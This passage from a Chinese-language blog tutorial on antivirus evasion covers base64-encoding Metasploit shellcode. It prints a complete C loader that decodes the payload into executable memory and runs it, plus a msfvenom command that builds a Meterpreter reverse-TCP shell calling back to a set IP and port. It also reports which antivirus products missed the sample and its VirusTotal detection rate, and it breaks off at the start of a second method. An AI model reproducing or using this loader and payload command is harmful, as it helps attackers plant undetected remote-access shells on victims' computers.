alt=\"image-20220530145307544\"></p>\n<p>打开杀软，360和火绒均可查杀，其中360结果为“具有木马特征程序”（原po火绒静态可查杀但是行为检测没报警，360杀毒和卫士没有反应，直接上线）。</p>\n<p>virustotal.com上查杀率为21&#x2F;69（原po为15&#x2F;71）。</p>\n<p>360：</p>\n<p><img src=\"/./images/202205301454631.png\" alt=\"image-20220530145415574\"></p>\n<p>VT：</p>\n<p><img src=\"/./images/202205301456618.png\" alt=\"image-20220530145657512\"></p>\n<h3 id=\"方法7-base64加密1（VT免杀率21-68）\"><a href=\"#方法7-base64加密1（VT免杀率21-68）\" class=\"headerlink\" title=\"方法7 base64加密1（VT免杀率21&#x2F;68）\"></a>方法7 base64加密1（VT免杀率21&#x2F;68）</h3><p>需要两个文件，<code>base64.c</code>和<code>base64.h</code></p>\n<p><code>base64.c</code>文件内容：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">/* Base64 encoder/decoder. Originally Apache file ap_base64.c</span></span><br><span class=\"line\"><span class=\"comment\">*/</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;string.h&gt;</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&quot;base64.h&quot;</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/* aaaack but it&#x27;s fast and const should make it shared text page. */</span></span><br><span class=\"line\"><span class=\"type\">static</span> <span class=\"type\">const</span> <span class=\"type\">unsigned</span> <span class=\"type\">char</span> pr2six[<span class=\"number\">256</span>] =</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"comment\">/* ASCII table */</span></span><br><span class=\"line\">    <span class=\"number\">64</span>, <span class=\"number\">64</span>, <span class=\"number\">64</span>, <span class=\"number\">64</span>, <span class=\"number\">64</span>, <span class=\"number\">64</span>, <span class=\"number\">64</span>, <span class=\"number\">64</span>, <span class=\"number\">64</span>, <span class=\"number\">64</span>, <span class=\"number\">64</span>, <span class=\"number\">64</span>, <span class=\"number\">64</span>, <span class=\"number\">64</span>, <span class=\"number\">64</span>, <span class=\"number\">64</span>,</span><br><span class=\"line\">    <span class=\"number\">64</span>, <span class=\"number\">64</span>, <span class=\"number\">64</span>, <span class=\"number\">64</span>, <span class=\"number\">64</span>, <span class=\"number\">64</span>, <span class=\"number\">64</span>, <span class=\"number\">64</span>, <span class=\"number\">64</span>, <span class=\"number\">64</span>, <span class=\"number\">64</span>, <span class=\"number\">64</span>, <span class=\"number\">64</span>, <span class=\"number\">64</span>, <span class=\"number\">64</span>, <span class=\"number\">64</span>,</span><br><span class=\"line\">    <span class=\"number\">64</span>, <span class=\"number\">64</span>, <span class=\"number\">64</span>, <span class=\"number\">64</span>, <span class=\"number\">64</span>, <span class=\"number\">64</span>, <span class=\"number\">64</span>, <span class=\"number\">64</span>, <span class=\"number\">64</span>, <span class=\"number\">64</span>, <span class=\"number\">64</span>, <span class=\"number\">62</span>, <span class=\"number\">64</span>, <span class=\"number\">64</span>, <span class=\"number\">64</span>, <span class=\"number\">63</span>,</span><br><span class=\"line\">    <span class=\"number\">52</span>, <span class=\"number\">53</span>, <span class=\"number\">54</span>, <span class=\"number\">55</span>, <span class=\"number\">56</span>, <span class=\"number\">57</span>, <span class=\"number\">58</span>, <span class=\"number\">59</span>, <span class=\"number\">60</span>, <span class=\"number\">61</span>, <span class=\"number\">64</span>, <span class=\"number\">64</span>, <span class=\"number\">64</span>, <span class=\"number\">64</span>, <span class=\"number\">64</span>, <span class=\"number\">64</span>,</span><br><span class=\"line\">    <span class=\"number\">64</span>,  <span class=\"number\">0</span>,  <span class=\"number\">1</span>,  <span class=\"number\">2</span>,  <span class=\"number\">3</span>,  <span class=\"number\">4</span>,  <span class=\"number\">5</span>,  <span class=\"number\">6</span>,  <span class=\"number\">7</span>,  <span class=\"number\">8</span>,  <span class=\"number\">9</span>, <span class=\"number\">10</span>, <span class=\"number\">11</span>, <span class=\"number\">12</span>, <span class=\"number\">13</span>, <span class=\"number\">14</span>,</span><br><span class=\"line\">    <span class=\"number\">15</span>, <span class=\"number\">16</span>, <span class=\"number\">17</span>, <span class=\"number\">18</span>, <span class=\"number\">19</span>, <span class=\"number\">20</span>, <span class=\"number\">21</span>, <span class=\"number\">22</span>, <span class=\"number\">23</span>, <span class=\"number\">24</span>, <span class=\"number\">25</span>, <span class=\"number\">64</span>, <span class=\"number\">64</span>, <span class=\"number\">64</span>, <span class=\"number\">64</span>, <span class=\"number\">64</span>,</span><br><span class=\"line\">    <span class=\"number\">64</span>, <span class=\"number\">26</span>, <span class=\"number\">27</span>, <span class=\"number\">28</span>, <span class=\"number\">29</span>, <span class=\"number\">30</span>, <span class=\"number\">31</span>, <span class=\"number\">32</span>, <span class=\"number\">33</span>, <span class=\"number\">34</span>, <span class=\"number\">35</span>, <span class=\"number\">36</span>, <span class=\"number\">37</span>, <span class=\"number\">38</span>, <span class=\"number\">39</span>, <span class=\"number\">40</span>,</span><br><span class=\"line\">    <span class=\"number\">41</span>, <span class=\"number\">42</span>, <span class=\"number\">43</span>, <span class=\"number\">44</span>, <span class=\"number\">45</span>, <span class=\"number\">46</span>, <span class=\"number\">47</span>, <span class=\"number\">48</span>, <span class=\"number\">49</span>, <span class=\"number\">50</span>, <span class=\"number\">51</span>, <span class=\"number\">64</span>, <span class=\"number\">64</span>, <span class=\"number\">64</span>, <span class=\"number\">64</span>, <span class=\"number\">64</span>,</span><br><span class=\"line\">    <span class=\"number\">64</span>, <span class=\"number\">64</span>, <span class=\"number\">64</span>, <span class=\"number\">64</span>, <span class=\"number\">64</span>, <span class=\"number\">64</span>, <span class=\"number\">64</span>, <span class=\"number\">64</span>, <span class=\"number\">64</span>, <span class=\"number\">64</span>, <span class=\"number\">64</span>, <span class=\"number\">64</span>, <span class=\"number\">64</span>, <span class=\"number\">64</span>, <span class=\"number\">64</span>, <span class=\"number\">64</span>,</span><br><span class=\"line\">    <span class=\"number\">64</span>, <span class=\"number\">64</span>, <span class=\"number\">64</span>, <span class=\"number\">64</span>, <span class=\"number\">64</span>, <span class=\"number\">64</span>, <span class=\"number\">64</span>, <span class=\"number\">64</span>, <span class=\"number\">64</span>, <span class=\"number\">64</span>, <span class=\"number\">64</span>, <span class=\"number\">64</span>, <span class=\"number\">64</span>, <span class=\"number\">64</span>, <span class=\"number\">64</span>, <span class=\"number\">64</span>,</span><br><span class=\"line\">    <span class=\"number\">64</span>, <span class=\"number\">64</span>, <span class=\"number\">64</span>, <span class=\"number\">64</span>, <span class=\"number\">64</span>, <span class=\"number\">64</span>, <span class=\"number\">64</span>, <span class=\"number\">64</span>, <span class=\"number\">64</span>, <span class=\"number\">64</span>, <span class=\"number\">64</span>, <span class=\"number\">64</span>, <span class=\"number\">64</span>, <span class=\"number\">64</span>, <span class=\"number\">64</span>, <span class=\"number\">64</span>,</span><br><span class=\"line\">    <span class=\"number\">64</span>, <span class=\"number\">64</span>, <span class=\"number\">64</span>, <span class=\"number\">64</span>, <span class=\"number\">64</span>, <span class=\"number\">64</span>, <span class=\"number\">64</span>, <span class=\"number\">64</span>, <span class=\"number\">64</span>, <span class=\"number\">64</span>, <span class=\"number\">64</span>, <span class=\"number\">64</span>, <span class=\"number\">64</span>, <span class=\"number\">64</span>, <span class=\"number\">64</span>, <span class=\"number\">64</span>,</span><br><span class=\"line\">    <span class=\"number\">64</span>, <span class=\"number\">64</span>, <span class=\"number\">64</span>, <span class=\"number\">64</span>, <span class=\"number\">64</span>, <span class=\"number\">64</span>, <span class=\"number\">64</span>, <span class=\"number\">64</span>, <span class=\"number\">64</span>, <span class=\"number\">64</span>, <span class=\"number\">64</span>, <span class=\"number\">64</span>, <span class=\"number\">64</span>, <span class=\"number\">64</span>, <span class=\"number\">64</span>, <span class=\"number\">64</span>,</span><br><span class=\"line\">    <span class=\"number\">64</span>, <span class=\"number\">64</span>, <span class=\"number\">64</span>, <span class=\"number\">64</span>, <span class=\"number\">64</span>, <span class=\"number\">64</span>, <span class=\"number\">64</span>, <span class=\"number\">64</span>, <span class=\"number\">64</span>, <span class=\"number\">64</span>, <span class=\"number\">64</span>, <span class=\"number\">64</span>, <span class=\"number\">64</span>, <span class=\"number\">64</span>, <span class=\"number\">64</span>, <span class=\"number\">64</span>,</span><br><span class=\"line\">    <span class=\"number\">64</span>, <span class=\"number\">64</span>, <span class=\"number\">64</span>, <span class=\"number\">64</span>, <span class=\"number\">64</span>, <span class=\"number\">64</span>, <span class=\"number\">64</span>, <span class=\"number\">64</span>, <span class=\"number\">64</span>, <span class=\"number\">64</span>, <span class=\"number\">64</span>, <span class=\"number\">64</span>, <span class=\"number\">64</span>, <span class=\"number\">64</span>, <span class=\"number\">64</span>, <span class=\"number\">64</span>,</span><br><span class=\"line\">    <span class=\"number\">64</span>, <span class=\"number\">64</span>, <span class=\"number\">64</span>, <span class=\"number\">64</span>, <span class=\"number\">64</span>, <span class=\"number\">64</span>, <span class=\"number\">64</span>, <span class=\"number\">64</span>, <span class=\"number\">64</span>, <span class=\"number\">64</span>, <span class=\"number\">64</span>, <span class=\"number\">64</span>, <span class=\"number\">64</span>, <span class=\"number\">64</span>, <span class=\"number\">64</span>, <span class=\"number\">64</span></span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">Base64decode_len</span><span class=\"params\">(<span class=\"type\">const</span> <span class=\"type\">char</span> *bufcoded)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"type\">int</span> nbytesdecoded;</span><br><span class=\"line\">    <span class=\"keyword\">register</span> <span class=\"type\">const</span> <span class=\"type\">unsigned</span> <span class=\"type\">char</span> *bufin;</span><br><span class=\"line\">    <span class=\"keyword\">register</span> <span class=\"type\">int</span> nprbytes;</span><br><span class=\"line\"></span><br><span class=\"line\">    bufin = (<span class=\"type\">const</span> <span class=\"type\">unsigned</span> <span class=\"type\">char</span> *)bufcoded;</span><br><span class=\"line\">    <span class=\"keyword\">while</span> (pr2six[*(bufin++)] &lt;= <span class=\"number\">63</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">    nprbytes = (bufin - (<span class=\"type\">const</span> <span class=\"type\">unsigned</span> <span class=\"type\">char</span> *)bufcoded) - <span class=\"number\">1</span>;</span><br><span class=\"line\">    nbytesdecoded = ((nprbytes + <span class=\"number\">3</span>) / <span class=\"number\">4</span>) * <span class=\"number\">3</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">return</span> nbytesdecoded + <span class=\"number\">1</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">Base64decode</span><span class=\"params\">(<span class=\"type\">char</span> *bufplain, <span class=\"type\">const</span> <span class=\"type\">char</span> *bufcoded)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"type\">int</span> nbytesdecoded;</span><br><span class=\"line\">    <span class=\"keyword\">register</span> <span class=\"type\">const</span> <span class=\"type\">unsigned</span> <span class=\"type\">char</span> *bufin;</span><br><span class=\"line\">    <span class=\"keyword\">register</span> <span class=\"type\">unsigned</span> <span class=\"type\">char</span> *bufout;</span><br><span class=\"line\">    <span class=\"keyword\">register</span> <span class=\"type\">int</span> nprbytes;</span><br><span class=\"line\"></span><br><span class=\"line\">    bufin = (<span class=\"type\">const</span> <span class=\"type\">unsigned</span> <span class=\"type\">char</span> *)bufcoded;</span><br><span class=\"line\">    <span class=\"keyword\">while</span> (pr2six[*(bufin++)] &lt;= <span class=\"number\">63</span>);</span><br><span class=\"line\">    nprbytes = (bufin - (<span class=\"type\">const</span> <span class=\"type\">unsigned</span> <span class=\"type\">char</span> *)bufcoded) - <span class=\"number\">1</span>;</span><br><span class=\"line\">    nbytesdecoded = ((nprbytes + <span class=\"number\">3</span>) / <span class=\"number\">4</span>) * <span class=\"number\">3</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    bufout = (<span class=\"type\">unsigned</span> <span class=\"type\">char</span> *)bufplain;</span><br><span class=\"line\">    bufin = (<span class=\"type\">const</span> <span class=\"type\">unsigned</span> <span class=\"type\">char</span> *)bufcoded;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">while</span> (nprbytes &gt; <span class=\"number\">4</span>) &#123;</span><br><span class=\"line\">        *(bufout++) =</span><br><span class=\"line\">            (<span class=\"type\">unsigned</span> <span class=\"type\">char</span>)(pr2six[*bufin] &lt;&lt; <span class=\"number\">2</span> | pr2six[bufin[<span class=\"number\">1</span>]] &gt;&gt; <span class=\"number\">4</span>);</span><br><span class=\"line\">        *(bufout++) =</span><br><span class=\"line\">            (<span class=\"type\">unsigned</span> <span class=\"type\">char</span>)(pr2six[bufin[<span class=\"number\">1</span>]] &lt;&lt; <span class=\"number\">4</span> | pr2six[bufin[<span class=\"number\">2</span>]] &gt;&gt; <span class=\"number\">2</span>);</span><br><span class=\"line\">        *(bufout++) =</span><br><span class=\"line\">            (<span class=\"type\">unsigned</span> <span class=\"type\">char</span>)(pr2six[bufin[<span class=\"number\">2</span>]] &lt;&lt; <span class=\"number\">6</span> | pr2six[bufin[<span class=\"number\">3</span>]]);</span><br><span class=\"line\">        bufin += <span class=\"number\">4</span>;</span><br><span class=\"line\">        nprbytes -= <span class=\"number\">4</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">/* Note: (nprbytes == 1) would be an error, so just ingore that case */</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (nprbytes &gt; <span class=\"number\">1</span>) &#123;</span><br><span class=\"line\">        *(bufout++) =</span><br><span class=\"line\">            (<span class=\"type\">unsigned</span> <span class=\"type\">char</span>)(pr2six[*bufin] &lt;&lt; <span class=\"number\">2</span> | pr2six[bufin[<span class=\"number\">1</span>]] &gt;&gt; <span class=\"number\">4</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (nprbytes &gt; <span class=\"number\">2</span>) &#123;</span><br><span class=\"line\">        *(bufout++) =</span><br><span class=\"line\">            (<span class=\"type\">unsigned</span> <span class=\"type\">char</span>)(pr2six[bufin[<span class=\"number\">1</span>]] &lt;&lt; <span class=\"number\">4</span> | pr2six[bufin[<span class=\"number\">2</span>]] &gt;&gt; <span class=\"number\">2</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (nprbytes &gt; <span class=\"number\">3</span>) &#123;</span><br><span class=\"line\">        *(bufout++) =</span><br><span class=\"line\">            (<span class=\"type\">unsigned</span> <span class=\"type\">char</span>)(pr2six[bufin[<span class=\"number\">2</span>]] &lt;&lt; <span class=\"number\">6</span> | pr2six[bufin[<span class=\"number\">3</span>]]);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    *(bufout++) = <span class=\"string\">&#x27;\\0&#x27;</span>;</span><br><span class=\"line\">    nbytesdecoded -= (<span class=\"number\">4</span> - nprbytes) &amp; <span class=\"number\">3</span>;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> nbytesdecoded;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">static</span> <span class=\"type\">const</span> <span class=\"type\">char</span> basis_64[] =</span><br><span class=\"line\"><span class=\"string\">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&quot;</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">Base64encode_len</span><span class=\"params\">(<span class=\"type\">int</span> len)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> ((len + <span class=\"number\">2</span>) / <span class=\"number\">3</span> * <span class=\"number\">4</span>) + <span class=\"number\">1</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">Base64encode</span><span class=\"params\">(<span class=\"type\">char</span> *encoded, <span class=\"type\">const</span> <span class=\"type\">char</span> *<span class=\"built_in\">string</span>, <span class=\"type\">int</span> len)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"type\">int</span> i;</span><br><span class=\"line\">    <span class=\"type\">char</span> *p;</span><br><span class=\"line\"></span><br><span class=\"line\">    p = encoded;</span><br><span class=\"line\">    <span class=\"keyword\">for</span> (i = <span class=\"number\">0</span>; i &lt; len - <span class=\"number\">2</span>; i += <span class=\"number\">3</span>) &#123;</span><br><span class=\"line\">        *p++ = basis_64[(<span class=\"built_in\">string</span>[i] &gt;&gt; <span class=\"number\">2</span>) &amp; <span class=\"number\">0x3F</span>];</span><br><span class=\"line\">        *p++ = basis_64[((<span class=\"built_in\">string</span>[i] &amp; <span class=\"number\">0x3</span>) &lt;&lt; <span class=\"number\">4</span>) |</span><br><span class=\"line\">            ((<span class=\"type\">int</span>)(<span class=\"built_in\">string</span>[i + <span class=\"number\">1</span>] &amp; <span class=\"number\">0xF0</span>) &gt;&gt; <span class=\"number\">4</span>)];</span><br><span class=\"line\">        *p++ = basis_64[((<span class=\"built_in\">string</span>[i + <span class=\"number\">1</span>] &amp; <span class=\"number\">0xF</span>) &lt;&lt; <span class=\"number\">2</span>) |</span><br><span class=\"line\">            ((<span class=\"type\">int</span>)(<span class=\"built_in\">string</span>[i + <span class=\"number\">2</span>] &amp; <span class=\"number\">0xC0</span>) &gt;&gt; <span class=\"number\">6</span>)];</span><br><span class=\"line\">        *p++ = basis_64[<span class=\"built_in\">string</span>[i + <span class=\"number\">2</span>] &amp; <span class=\"number\">0x3F</span>];</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (i &lt; len) &#123;</span><br><span class=\"line\">        *p++ = basis_64[(<span class=\"built_in\">string</span>[i] &gt;&gt; <span class=\"number\">2</span>) &amp; <span class=\"number\">0x3F</span>];</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (i == (len - <span class=\"number\">1</span>)) &#123;</span><br><span class=\"line\">            *p++ = basis_64[((<span class=\"built_in\">string</span>[i] &amp; <span class=\"number\">0x3</span>) &lt;&lt; <span class=\"number\">4</span>)];</span><br><span class=\"line\">            <span class=\"comment\">//    *p++ = &#x27;=&#x27;;</span></span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">            *p++ = basis_64[((<span class=\"built_in\">string</span>[i] &amp; <span class=\"number\">0x3</span>) &lt;&lt; <span class=\"number\">4</span>) |</span><br><span class=\"line\">                ((<span class=\"type\">int</span>)(<span class=\"built_in\">string</span>[i + <span class=\"number\">1</span>] &amp; <span class=\"number\">0xF0</span>) &gt;&gt; <span class=\"number\">4</span>)];</span><br><span class=\"line\">            *p++ = basis_64[((<span class=\"built_in\">string</span>[i + <span class=\"number\">1</span>] &amp; <span class=\"number\">0xF</span>) &lt;&lt; <span class=\"number\">2</span>)];</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"comment\">//*p++ = &#x27;=&#x27;;</span></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    *p++ = <span class=\"string\">&#x27;\\0&#x27;</span>;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> p - encoded;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p><code>base64.h</code>文件内容：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">ifndef</span> _BASE64_H_</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> _BASE64_H_</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">ifdef</span> __cplusplus</span></span><br><span class=\"line\"><span class=\"keyword\">extern</span> <span class=\"string\">&quot;C&quot;</span> &#123;</span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">endif</span></span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"type\">int</span> <span class=\"title function_\">Base64encode_len</span><span class=\"params\">(<span class=\"type\">int</span> len)</span>;</span><br><span class=\"line\">    <span class=\"type\">int</span> <span class=\"title function_\">Base64encode</span><span class=\"params\">(<span class=\"type\">char</span> * coded_dst, <span class=\"type\">const</span> <span class=\"type\">char</span> *plain_src, <span class=\"type\">int</span> len_plain_src)</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"type\">int</span> <span class=\"title function_\">Base64decode_len</span><span class=\"params\">(<span class=\"type\">const</span> <span class=\"type\">char</span> * coded_src)</span>;</span><br><span class=\"line\">    <span class=\"type\">int</span> <span class=\"title function_\">Base64decode</span><span class=\"params\">(<span class=\"type\">char</span> * plain_dst, <span class=\"type\">const</span> <span class=\"type\">char</span> *coded_src)</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">ifdef</span> __cplusplus</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">endif</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">endif</span> <span class=\"comment\">//_BASE64_H_</span></span></span><br></pre></td></tr></table></figure>\n\n<p><code>shellcode.c</code>文件内容：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;Windows.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;string.h&gt;</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&quot;base64.h&quot;</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">unsigned</span> <span class=\"type\">char</span> buf[] =</span><br><span class=\"line\"><span class=\"string\">&quot;msf base64 code here&quot;</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 原po代码报错，这里做了一些强制转换和类型修正</span></span><br><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">main</span><span class=\"params\">(<span class=\"type\">int</span> argc, <span class=\"type\">const</span> <span class=\"type\">char</span>* argv[])</span> &#123;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"type\">char</span> str1[<span class=\"number\">1000</span>] = &#123; <span class=\"number\">0</span> &#125;;</span><br><span class=\"line\">    Base64decode(str1, (<span class=\"type\">char</span>*)buf);</span><br><span class=\"line\">    LPVOID Memory;</span><br><span class=\"line\">    Memory = VirtualAlloc(<span class=\"literal\">NULL</span>, <span class=\"keyword\">sizeof</span>(str1), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);</span><br><span class=\"line\">    <span class=\"built_in\">memcpy</span>(Memory, str1, <span class=\"keyword\">sizeof</span>(str1));</span><br><span class=\"line\">    ((<span class=\"type\">void</span>(*)())Memory)();</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>使用msf生成base64编码的shellcode：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">msfvenom -p  windows/meterpreter/reverse_tcp --encrypt base64  lhost=192.168.174.128 lport=6666  -f c &gt; shell.c</span><br></pre></td></tr></table></figure>\n\n<p>把<code>shell.c</code>的内容复制到上面<code>shellcode.c</code>文件中。vs2019编译，关闭杀软，msf可成功上线。</p>\n<p>打开杀软，火绒可以查杀，<strong>360不能查杀</strong>（原po火绒静态查杀会报毒，但行为检测没有反应，360全通过）。</p>\n<p>virustotal.com查杀率为21&#x2F;68（原po为28&#x2F;69）。</p>\n<p><img src=\"/./images/202205301526558.png\" alt=\"image-20220530152630449\"></p>\n<h3 id=\"方法8-base64加密2（VT免杀率17-67）\"><a href=\"#方法8-base64加密2（VT免杀率17-67）\" class=\"headerlink\" title=\"方法8 base64加密2（VT免杀率17&#x2F;67）\"></a>方法8 base64加密2（VT免杀率17&#x2F;67）</h3><p>另外一种base64加密方式，和方法7类似，实现代码略有不同。</p>\n<p><code>base64.c</code>文件内容：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span 